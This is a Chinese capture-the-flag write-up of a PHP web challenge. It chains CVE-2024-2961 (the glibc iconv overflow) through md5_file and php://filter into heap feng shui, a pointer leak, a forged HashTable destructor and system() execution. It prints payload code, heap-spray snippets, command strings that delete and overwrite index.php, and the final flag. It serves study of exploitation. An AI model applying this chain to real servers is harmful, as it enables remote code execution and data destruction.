# dddɘw

## 题目简述

题目表面是一个在线视频播放器，后端只暴露两个有用接口：

- `GET /Items` 返回一个由 `index.php` 路径计算出的 8 位视频 ID。
- `POST /Videos/<ID>/stream` 接收播放参数并返回 JSON。

真正的输入处理集中在下面两段代码中：

```php
function c($x, $y, $z) {
    if (
        !is_string($x) || !is_string($y) || !is_string($z) ||
        strlen($x) > 1048576 ||
        strlen($y) > 256 ||
        strlen($z) > 262144
    ) {
        http_response_code(400);
        exit;
    }
    $v = json_decode($x, true);
    if (!is_array($v)) {
        $v = [];
    }
    header('Content-Type: application/json');
    $v[$y] = md5_file($z);
    echo json_encode($v);
    exit;
}

function d($s) {
    $r = [];
    foreach (explode(';', (string)$s) as $i => $p) {
        if ($p === '') {
            continue;
        }
        $q = explode('=', $p, 2);
        if (count($q) === 2) {
            $r[strtolower(rawurldecode($q[0]))]
                = rawurldecode($q[1]);
        } else {
            $r[$i] = rawurldecode($p);
        }
    }
    return $r;
}
```

Solver 使用 `params=<catalog>;<slot>;<resource>` 形式：

- `catalog` 是不超过 1 MiB 的 JSON，解码为 `$v`；
- `slot` 是最终被赋值的数组键 `$y`；
- `resource` 直接传给 `md5_file()`。

`md5_file()` 支持 PHP stream wrapper，因此第三个参数不只是文件路径，也可以是 `php://filter/...`。容器又特意使用 PHP 8.4.0-dev，并在升级系统依赖前备份、升级后恢复旧版 `ISO-2022-CN-EXT.so`。这明确指向 glibc `iconv()` 的 CVE-2024-2961，也就是常说的 CNEXT 利用链。题面虽然是 Web，但决定 flag 的主要障碍是 PHP/glibc 堆利用。

题目还给 PHP 打了三组加固补丁：

- `a.patch` 把超全局输入与普通运行时对象放入两个独立 Zend MM zone；
- `b.patch` 将部分分配器元数据放进只读页；
- `c.patch` 在 `php_stream_bucket_unlink()` 中检查双向链表关系。

因此不能照搬普通 CNEXT 任意写模板。本题需要在不破坏只读元数据和 bucket 一致性检查的前提下，利用 JSON 对象完成堆风水、指针泄漏和伪 `HashTable` 调用。

## 解题过程

### 1. 从 `md5_file` 到 iconv 越界写

先访问 `/Items` 获得 ID，再向对应的 stream 路由提交：

```text
{"p":""};p;/etc/passwd
```

服务返回 `/etc/passwd` 的 MD5，证明第三段是无目录限制的 `md5_file()` 参数。将它换成 filter wrapper 后，PHP 会读取内层 resource，并把数据送入指定 filter：

```text
php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=...
```

CVE-2024-2961 的根因是 glibc 的 `ISO-2022-CN-EXT` 转换器在输出缓冲区边界附近仍可能写入额外的转义序列，造成 1～3 字节越界写。利用载荷使用末尾字符 `劄` 触发目标转换分支：

```python
trigger = (
    "OVERFLOW".ljust(0x2000 - 3, "A") + "劄"
).encode()
```

为了缩短 resource，并避免在 filter brigade 中增加一个会改变堆布局的 `zlib.inflate` filter，我把 gzip 放在 resource wrapper 层：

```python
compressor = zlib.compressobj(level=9, wbits=31)
compressed = compressor.compress(trigger) + compressor.flush()
resource = (
    "php://filter/"
    "convert.iconv.UTF-8.ISO-2022-CN-EXT/"
    "resource=compress.zlib://data:text/plain;base64,"
    + base64.b64encode(compressed).decode()
)
```

这里有一个容易踩坑的区别：

- `zlib.inflate|convert.iconv...` 会多创建一个 filter，改变 bucket 和 buffer 的分配顺序；
- `convert.iconv.../resource=compress.zlib://...` 只让 wrapper 解压，iconv 仍是唯一的显式 filter，原堆布局可以保留。

CNEXT 的成因和 PHP filter 利用模型可参考 [Lexfo 的研究文章](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html) 与 [Ambionics 的公开 exploit](https://github.com/ambionics/cnext-exploits)。本题实际使用的堆风水骨架来自 [R3CTF 2026 definitely-not-a-web-chal](https://github.com/r3kapig/r3ctf-2026/tree/master/definitely-not-a-web-chal)，但后续所有偏移都必须针对本题重新校准。

### 2. 为什么参考 exploit 不能直接使用

R3CTF 参考题直接执行：

```php
$user_submit = json_decode($_POST['submit'], true);
$user_submit[$_POST['key']] = $_POST['submit'];
```

本题则先把一个大字符串送入 `d()`，经历 `explode()`、数组构造和多次 `rawurldecode()`，之后才进入 `c()`：

```php
$m = d($p);
c($m[0], $m[1], $m[2]);
```

这些额外对象虽然不改变 CNEXT 越界本身，却改变了默认 Zend MM zone 中的 56 字节对象和 4 KiB 页布局。直接运行公开 solver 时：

- iconv 越界地址正确；
- 被攻击的顶层 `HashTable` 也正确；
- 但最后伪造的引用指针落到目标后一页，泄漏值仍是普通字符串。

为排除版本误差，我按 Dockerfile 固定的 Ubuntu digest、PHP commit
`25360ef24951f1c6b83f8bf85fbdcaff4a1a40e1` 和三份 patch 构建了本地镜像，并恢复同一份旧 gconv 模块。随后分别用 GDB 跟踪：

- `ZEND_ASSIGN_DIM_SPEC_CV_CV_OP_DATA_VAR_HANDLER`；
- `zif_json_encode`；
- 顶层 `Up9}` bucket；
- 内层 `real_array["R96"]` bucket。

### 3. 泄漏：把字符串 zval 的类型从 6 减成 5

公开链先通过重复 JSON key 和 iconv 越界制造 UAF，再把顶层 `Up9}` 的 zval 伪造成 `IS_REFERENCE`。在最终的

```php
$v[$y] = md5_file($z);
```

中，Zend VM 会释放旧引用。伪引用的 refcount 地址被布置到
`real_array["R96"] + 8`，所以“refcount 减一”实际作用在 R96 的 `type_info` 上：

```text
IS_STRING = 6
6 - 1 = 5 = IS_DOUBLE
```

R96 的 8 字节 value 原本是 `zend_string *`。类型变成 `IS_DOUBLE` 后，`json_encode()` 会把这 8 字节指针位模式当作 double 输出；Python 再把 double 原样解释回 `uint64`，就得到指针：

```python
bits = struct.unpack("<Q", struct.pack("<d", leak))[0]
```

本题原始布局与修正后的关系如下：

| 布局 | 释放的 4 KiB 洞 | 伪引用指向 | 结果 |
|---|---:|---|---|
| R3CTF 参考题 | `Hold44/45` | `R96 + 8` | 成功 |
| 本题直接照搬 | `Hold44/45` | `Hold46 + 8` | 差一页 |
| 本题修正 | `Hold45/46` | `R96 + 8` | 成功 |

对应到脚本，就是把 leak 阶段的洞起点从 `pre_hole_24` 平移到 `pre_hole_25`：

```python
for index in range(25, 27):
    clear(submit, counters, f"pre_hole_{index}")
```

对 `R96` 放空字符串时，泄漏的是 FPM 附近的常量空串指针；放非空字符串时，泄漏的是 Zend heap 指针。最终利用只需要后者：

```text
zend leak     = 0x7f22f4e13000
Zend heap base= 0x7f22f4e00000
```

主 chunk 按 2 MiB 对齐：

```python
zend_base = zend_pointer & 0xffffffe00000
```

`a.patch` 并没有让这条链失效，因为超全局输入本身在 user-input zone，而 `json_decode()` 生成的数组、字符串和后续 stream filter 运行时对象仍可在普通 zone 中完成所需布局。`b.patch` 保护的是分配器元数据；本利用修改的是 PHP 数据对象。`c.patch` 会拒绝明显不一致的 bucket 链，但参考布局维持了 unlink 所需的前后关系，精确三补丁构建中仍可稳定完成泄漏。

### 4. 把 JSON 压到 1 MiB 内，同时保留 256 页堆形状

公开 solver 使用 256 个接近 4 KiB 的字符串：

```python
"*" * (0x1000 - 0x58)
```

本题的 `$x` 上限为 1 MiB，直接序列化会超限。不能简单删掉尾部 spray，也不能换成一个巨大的 packed array：虽然总分配量相似，但“一次 64 页分配”与“65 次单页分配”的 free-list 行为不同，write 阶段的 fake array 会落到错误的旧洞中。

最终采用：

- 前 191 个 Hold 仍使用长字符串；
- 后 65 个 Hold 改成 256 个整数的 packed array。

```python
def filler_page(index):
    if index == 15:
        return "C".ljust(0x1000 - 0x58, "S")
    if index < 191:
        return "*" * (0x1000 - 0x58)
    return [0] * 256
```

一个 `[0,0,...]` 数组在 JSON 中只占约 513 字节，但 PHP 解码后 256 个 zval 正好需要约 4096 字节。这样既保留了逐页分配形状，又满足输入限制：

| 阶段 | 最终 catalog 大小 |
|---|---:|
| leak | 1,020,524 字节 |
| write | 973,762 字节 |

### 5. 写原语：伪造 HashTable 并调用任意函数

write 阶段把 UAF 覆盖末字节从 `\x08` 改成 `\x18`，并在 packed array 中放置伪 `HashTable`：

```python
fake_ht = list(range(299))
fake_ht[1] = 0x0000000700000001
fake_ht[2] = arg0
fake_ht[4] = pc
fake_ht[5] = [[0x1337]]
```

其中：

- `fake_ht[1]` 伪造引用计数和数组类型；
- `fake_ht[2]` 最终成为传给析构函数的参数地址；
- `fake_ht[4]` 成为伪析构函数指针；
- 嵌套数组负责触发析构路径。

本题 write 阶段同样比参考题差一页，因此把三个连续洞从
`25/26/27` 平移为 `26/27/28`：

```python
for index in range(26, 29):
    clear(submit, counters, f"pre_hole_{index}")
```

调试器中最终得到：

```text
forged array = ...890018
real_data    = ...890008
```

即伪造的 `zend_array` 头正好位于可控 packed zval 数据的 `+0x10` 处，控制流可以落到 `pc`。

### 6. 用 `md5_file` 自己定位 system

远程 `libc.so.6` 的 MD5 为：

```text
da28dbab52c3bf778ba65fe790fefd55
```

它与本地精确镜像完全一致，因此 `system` 在 libc 内的页内偏移确定。未知量只剩 libc 映射相对 Zend 主 chunk 的页差。沿用参考 exploit 的扫描公式：

```python
pc = (
    zend_base
    + 0x200000
    + 0x2fdcd70
    + page * 0x1000
)
```

盲目判断 HTTP 200/502 不可靠：某些错误地址可能返回、挂起或直接杀死 worker。这里可以反过来利用题目自己的任意文件 MD5 oracle。每个候选页都执行一个 32 字节短命令：

```text
echo <page> >/tmp/dp;#
```

实际脚本使用了正确的重定向形式：

```python
EXP = f"echo {page:x}>/tmp/dp;#".ljust(32)
```

随后用正常请求计算 `/tmp/dp` 的 MD5，并与
`md5((hex(page) + "\n").encode())` 比较。只有真正进入 `system()` 的候选会留下对应标记。该实例命中：

```text
page = 0x6f
system = 0x7f22f804bd70
```

Solver 会先尝试 `0x6f` 和本地镜像常见的 `0x74`，若未命中再覆盖参考脚本的完整页范围。错误候选即使杀死 FPM worker，master 重新 fork 的 worker 仍继承相同映射，本实例中 Zend 主 chunk 地址保持不变。

### 7. 四次 system 调用与最终 flag 回显

伪 `HashTable` 析构并不是只调用一次函数。GDB 观察到 `system()` 的参数依次为：

```text
arg0
arg0 + 0x10
arg0 + 0x20
arg0 + 0x30
```

如果直接放长命令，后续调用会从命令中间开始。例如 suffix
`>index.php` 会在 flag 写入后再次把文件截断为空。最终把命令前置 48 个空格：

```python
EXP = (
    " " * 48
    + "cd ../home/work/scripts;rm i*;/readflag>index.php"
)
```

于是四个入口分别看到 48、32、16、0 个前导空格，最后都执行同一条幂等命令。

这里先 `rm i*` 是因为 `index.php` 本身属于 root，worker 不能直接以写方式打开；但 `/home/work/scripts` 目录属于 worker，允许 unlink 后重新创建。Nginx 的 `/Items` 和 stream 路由都固定执行这个 `index.php`。把它替换为只含 flag 的普通文本后，下一次访问 `/Items` 就会直接输出 flag。

短命令与 97 字节长命令进入不同的 Zend MM size class，所以参数地址也不同：

```text
短探测命令：Zend base + 0x13018
最终长命令：Zend base + 0x11098
```

执行 Solver：

```bash
source /home/kali/miniforge3/etc/profile.d/conda.sh
conda activate ctf-tools
python solve.py --url '<TARGET>' --system-page 0x6f
conda deactivate
```

关键输出如下：

```text
[+] zend leak: 0x7f22f4e13000
[+] Zend heap base: 0x7f22f4e00000
[+] system: page=0x6f, pc=0x7f22f804bd70
[+] flag: d3ctf{NOw-iT_ls-TiM3_T0-hoLd-a-FunEr@I_F0R_cTF.990}
```

最终 flag：

```text
d3ctf{NOw-iT_ls-TiM3_T0-hoLd-a-FunEr@I_F0R_cTF.990}
```

最终阶段会替换一次性靶机中的 `index.php`，因此只应在比赛提供的可重置实例上运行。Solver 开头会先检测 `/Items` 中是否已经出现 flag；若实例已被本脚本打通，会直接打印现有结果而不再发送利用载荷。

## 方法总结

- 核心技巧：利用 `md5_file()` 接受 stream wrapper，把 glibc
  `ISO-2022-CN-EXT` 的 CVE-2024-2961 越界写转成 PHP bucket UAF，再通过伪引用的 refcount 减一完成指针泄漏，最后伪造 `HashTable` 析构函数指针取得代码执行。
- 识别信号：Dockerfile 特意“备份旧 gconv 模块、升级系统、再恢复模块”，同时业务代码把可控字符串传给 `md5_file()`，几乎就是 CNEXT 的明示。看到 PHP filter、旧 iconv 模块和大 JSON 输入时，应优先检查堆风水，而不是停留在普通任意文件哈希。
- 适配要点：公开 exploit 的漏洞原语可以复用，但函数包装、URL 解码、局部变量、JSON 限制和 VM handler 都会改变对象地址。本题必须用精确镜像确认“越界命中”和“目标 zval 命中”是两件不同的事。
- 压缩要点：为了省 JSON 体积，应复现分配次数和 size class，而不只是复现总字节数。65 个 256 元素 packed array 能模拟 65 次 4 KiB 分配；一个 16384 元素大数组虽然总大小相同，却不能替代。
- 调试要点：泄漏阶段跟踪最终赋值 target、伪引用 pointer 和 JSON 输出 bucket；写阶段同时记录 fake array 数据、命令字符串和函数入口。只看 200/502 很容易把布局失败、错误函数地址和命令失败混为一谈。
- 复用要点：当目标本身提供文件哈希 oracle 时，可以让候选代码执行写入带编号的临时文件，再用哈希确认候选。这比依赖响应状态或外部 webhook 更稳定，也减少了盲扫。
- 外部参考：上文链接的 R3CTF 参考题提供了重复键、堆洞和伪 `HashTable` 的基础形状；Lexfo 分析与 Ambionics exploit 解释了 iconv OOB 和 PHP filter bucket；[GhostFrank 的 PHP 复现材料](https://github.com/GhostFrankWu/PHP-security-research/tree/main/CVE-2024-2961) 可用于交叉核对环境条件。本文已经把本题实际使用的触发方式、布局改动、限制压缩和最终验证写入正文，复现不依赖这些链接继续可用。
